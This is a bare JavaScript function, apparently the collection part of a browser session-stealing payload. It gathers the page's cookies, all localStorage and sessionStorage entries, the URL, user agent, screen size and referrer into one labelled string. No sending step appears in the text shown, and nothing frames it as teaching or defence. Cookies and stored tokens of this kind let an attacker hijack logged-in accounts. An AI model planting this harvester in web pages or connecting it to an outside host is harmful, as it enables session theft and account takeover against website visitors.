function grab() {
    var data = '';
    // Document cookies
    data += '[COOKIES]\n' + document.cookie + '\n\n';
    // localStorage
    data += '[LOCALSTORAGE]\n';
    try {
        for(var i=0; i<localStorage.length; i++) {
            var k = localStorage.key(i);
            data += k + '=' + localStorage.getItem(k) + '\n';
        }
    } catch(e) { data += 'error\n'; }
    // sessionStorage
    data += '\n[SESSIONSTORAGE]\n';
    try {
        for(var i=0; i<sessionStorage.length; i++) {
            var k = sessionStorage.key(i);
            data += k + '=' + sessionStorage.getItem(k) + '\n';
        }
    } catch(e) { data += 'error\n'; }
    // Info
    data += '\n[INFO]\n';
    data += 'URL: ' + window.location.href + '\n';
    data += 'UA: ' + navigator.userAgent + '\n';
    data += 'Screen: ' + screen.width + 'x' + screen.height + '\n';
    data += 'Referrer: ' + document.referrer + '\n';
    data += 'Time: ' + new Date().toISOString() + '\n';
    return data;
}
